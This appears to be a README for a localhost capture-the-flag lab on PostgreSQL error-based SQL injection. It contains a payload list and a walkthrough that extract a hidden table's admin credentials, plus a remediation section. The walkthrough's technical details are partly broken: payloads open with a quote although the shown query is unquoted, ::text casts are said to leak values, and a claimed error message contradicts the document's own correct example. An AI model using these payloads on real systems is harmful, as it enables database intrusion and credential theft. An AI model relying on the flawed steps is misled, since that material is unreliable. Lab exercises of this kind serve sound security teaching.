# PostgreSQL Error-Based SQL Injection Lab

## Level: Easy
## Technique: Error-Based SQL Injection (Type Casting & Syntax Leakage)

### Objective
Extract the admin credentials from the `secret_admin` table and retrieve the flag.

### Challenge Description
This lab demonstrates **PostgreSQL Error-Based SQL Injection** using type casting and syntax leakage. The application displays verbose PostgreSQL error messages that can be leveraged to extract sensitive data from the database.

### Target
- **URL**: `http://localhost:<random_port>`
- **Goal**: Extract admin username and password, then login at `/admin` to get the flag

---

## Vulnerability Analysis

### The Vulnerable Query
```python
# app.py line 134
query = f"SELECT * FROM products WHERE id = {product_id}"
cursor.execute(query)
```

### Why It's Vulnerable
1. **Direct string interpolation** - User input is concatenated directly into the SQL query
2. **Verbose error messages** - Full PostgreSQL errors are displayed to the user
3. **Type casting exposure** - PostgreSQL type errors leak column values and structure

---

## Exploitation Techniques

### 1. Confirm PostgreSQL Database
Submit a single quote to trigger a PostgreSQL error:
```
'
```
**Expected response**: `syntax error at or near "'"` - Confirms PostgreSQL

### 2. Discover Table Names
Use type casting with `pg_tables` to list all tables:
```
1' AND CAST((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET 0) AS INT) > 0--
```
Or simpler - cause a type error:
```
1' AND (SELECT tablename FROM pg_tables LIMIT 1 OFFSET 0)::int--
```
**Expected response**: Error message showing first table name

### 3. Find Hidden Tables
Continue iterating through `pg_tables`:
```
1' AND (SELECT tablename FROM pg_tables LIMIT 1 OFFSET 1)::int--
```
**Goal**: Find the `secret_admin` table

### 4. Enumerate Columns in secret_admin
Query `information_schema.columns`:
```
1' AND (SELECT column_name FROM information_schema.columns WHERE table_name='secret_admin' LIMIT 1 OFFSET 0)::text--
```
This reveals: `id`, `username`, `password`, `role`, `flag`

### 5. Extract Admin Username
Use type casting to extract the username:
```
1' AND (SELECT username FROM secret_admin LIMIT 1)::text--
```
Or force a type conversion that reveals the value:
```
1' AND CAST((SELECT username FROM secret_admin WHERE username='admin') AS INT)--
```

### 6. Extract Admin Password
Extract password using the same technique:
```
1' AND (SELECT password FROM secret_admin WHERE username='admin')::text--
```

### 7. Alternative: Character-by-Character Extraction
For longer values, test each character:
```
1' AND (SELECT SUBSTR((SELECT password FROM secret_admin WHERE username='admin'), 1, 1)) = 'a'--
```

### 8. Login and Get Flag
Navigate to `/admin` and use the extracted credentials to login.

---

## PostgreSQL Error-Based Payloads Reference

### Type Casting Syntax
```sql
-- Standard CAST
CAST(column AS type)

-- PostgreSQL shorthand
column::type
column::int
column::text
```

### Data Extraction Techniques

#### Extract Single Value
```
1' AND (SELECT username FROM secret_admin LIMIT 1)::int--
```

#### Extract with UNION
```
1' UNION SELECT CAST(username AS INT), 2, 3, 4, 5 FROM secret_admin--
```

#### Conditional Extraction
```
1' AND (SELECT LENGTH(password) FROM secret_admin WHERE username='admin') > 10--
```

#### Table Discovery
```
1' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public') > 0--
```

### Useful PostgreSQL Functions for Error-Based Injection
| Function | Purpose |
|----------|---------|
| `CURRENT_USER` | Get database user |
| `CURRENT_DATABASE()` | Get database name |
| `VERSION()` | Get PostgreSQL version |
| `SUBSTR(str, start, len)` | Extract substring |
| `LENGTH(str)` | Get string length |
| `ASCII(char)` | Get ASCII value |
| `CHR(num)` | Convert ASCII to character |

---

## Database Schema

### Products Table (Public)
| Column | Type |
|--------|------|
| id | SERIAL (PK) |
| name | TEXT |
| description | TEXT |
| price | TEXT |
| category | TEXT |

### secret_admin Table (Hidden)
| Column | Type | Content |
|--------|------|---------|
| id | SERIAL | 1 |
| username | TEXT | admin |
| password | TEXT | PostgreSQL@dm1nR00t! |
| role | TEXT | administrator |
| flag | TEXT | IDS{...} |

---

## How to Fix This Vulnerability

### 1. Use Parameterized Queries
```python
# VULNERABLE:
query = f"SELECT * FROM products WHERE id = {product_id}"

# SECURE:
cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))
```

### 2. Validate Input Type
```python
try:
    product_id = int(request.args.get('id', ''))
except ValueError:
    return render_template('index.html', error='Invalid product ID')
```

### 3. Disable Verbose Error Messages
```python
# NEVER expose full error messages to users
except Exception as e:
    logger.error(f"Database error: {e}")
    return render_template('index.html', error='An error occurred')
```

### 4. Use ORM Frameworks
```python
# SQLAlchemy handles parameterization automatically
product = Product.query.filter_by(id=product_id).first()
```

---

## Running the Lab

### Start the Lab
```bash
cd /home/labuser/tools/lab-sql/lab-sqli-easy
./start.sh
```

### View Logs
```bash
docker-compose logs -f
```

### Stop the Lab
```bash
./stop.sh
```

---

## Challenge Walkthrough

### Step 1: Initial Testing
```
Input: 1
Result: Shows product (Gaming Laptop)

Input: 1'
Result: syntax error - confirms PostgreSQL
```

### Step 2: Find Tables
```
Input: 1' AND (SELECT tablename FROM pg_tables LIMIT 1 OFFSET 0)::int--
Result: ERROR: value too long for type integer (shows 'products')

Input: 1' AND (SELECT tablename FROM pg_tables LIMIT 1 OFFSET 1)::int--
Result: ERROR: value too long for type integer (shows 'secret_admin')
```

### Step 3: Enumerate Columns
```
Input: 1' AND (SELECT column_name FROM information_schema.columns WHERE table_name='secret_admin' LIMIT 1 OFFSET 0)::text--
Result: Shows column names (id, username, password, role, flag)
```

### Step 4: Extract Credentials
```
Input: 1' AND (SELECT username FROM secret_admin)::text--
Result: Shows 'admin'

Input: 1' AND (SELECT password FROM secret_admin)::text--
Result: Shows 'PostgreSQL@dm1nR00t!'
```

### Step 5: Retrieve Flag
```
1. Navigate to http://localhost:<port>/admin
2. Enter username: admin
3. Enter password: PostgreSQL@dm1nR00t!
4. Get flag!
```

---

## Educational Notes

### Why Error-Based Injection Works
PostgreSQL error messages are designed to help developers debug issues. However, when these detailed errors are exposed to end users, attackers can:
- Extract database schema information
- Read sensitive data through type casting
- Understand query structure through syntax errors

### Type Casting in PostgreSQL
PostgreSQL is strongly typed. When you attempt to convert incompatible types, the error message reveals the value that couldn't be converted:
```sql
SELECT 'admin'::int
-- ERROR: invalid input syntax for type integer: "admin"
```

This "feature" can be exploited to leak data character by character.

---

## Resources
- [PostgreSQL Type Conversion](https://www.postgresql.org/docs/current/sql-expressions.html#SQL-SYNTAX-TYPE-CASTS)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CheatSheet: SQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
